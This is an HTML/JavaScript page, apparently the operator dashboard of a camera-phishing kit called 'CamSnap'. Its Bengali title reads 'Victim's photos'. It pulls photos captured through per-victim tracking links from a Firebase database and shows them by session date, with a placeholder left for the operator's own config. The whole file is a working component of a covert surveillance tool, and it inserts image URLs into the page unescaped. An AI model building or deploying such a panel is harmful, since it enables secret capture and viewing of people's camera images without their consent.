<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিকটিমের ছবি • CamSnap</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    body{background:#0f0f1a;color:#e0e0e0;font-family:'Segoe UI',sans-serif;padding:20px 15px;min-height:100vh;}
    .container{max-width:900px;margin:0 auto;}
    h1{text-align:center;color:#00ccff;font-size:2.2em;margin:20px 0;}
    .session{background:#1a1a2e;border-radius:18px;padding:20px;margin:25px 0;box-shadow:0 8px 25px rgba(0,0,0,0.4);}
    .date{color:#00ff9d;font-size:1.4em;font-weight:600;margin-bottom:12px;}
    .count{color:#aaa;margin-bottom:15px;}
    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;}
    .grid img{width:100%;height:220px;object-fit:cover;border-radius:14px;border:4px solid #0066ff;cursor:pointer;transition:0.3s;}
    .grid img:hover{transform:scale(1.05);box-shadow:0 10px 30px rgba(0,102,255,0.6);}
    .back-btn{display:block;margin:30px auto;padding:12px 30px;background:#0066ff;color:#fff;border:none;border-radius:12px;font-size:1.1em;cursor:pointer;}
  </style>
</head>
<body>
<div class="container">
  <h1>ভিকটিমের ছবি</h1>
  <div id="sessions"></div>
  <button class="back-btn" onclick="history.back()">ফিরে যাও</button>
</div>

<script>
const firebaseConfig = { /* তোমার কনফিগ */ };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const urlParams = new URLSearchParams(location.search);
const id = urlParams.get('id');

if (!id) {
  document.body.innerHTML = "<h1 style='color:red;text-align:center;margin:100px 0;'>লিংক ভুল!</h1>";
  throw new Error("No ID");
}

db.ref('links/' + id + '/sessions').on('value', (snap) => {
  const sessions = snap.val();
  const container = document.getElementById("sessions");

  if (!sessions || Object.keys(sessions).length === 0) {
    container.innerHTML = "<p style='text-align:center;color:#888;font-size:1.3em;padding:80px 0;'>এখনো কোনো ছবি আসেনি</p>";
    return;
  }

  let html = '';
  Object.keys(sessions).sort((a,b) => b.localeCompare(a)).forEach(date => {
    const session = sessions[date];
    const photos = session.photos || [];

    html += `
      <div class="session">
        <div class="date">${date}</div>
        <div class="count">${photos.length} টি ছবি</div>
        <div class="grid">
          ${photos.map(src => `<img src="${src}" onclick="window.open('${src}')">`).join('')}
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
});
</script>
</body>
</html>
